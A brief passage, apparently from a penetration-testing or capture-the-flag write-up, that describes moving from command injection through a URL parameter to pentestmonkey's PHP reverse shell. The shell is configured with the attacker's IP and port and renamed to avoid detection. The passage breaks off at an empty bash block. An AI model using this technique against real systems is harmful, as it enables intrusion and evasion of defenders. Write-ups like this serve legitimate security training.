...
Manually issuing commands through the URL parameter was slow, so a PHP reverse shell (pentestmonkey's php-reverse-shell) was downloaded, configured with the attacker's IP/port, and renamed to avoid detection:
```bash
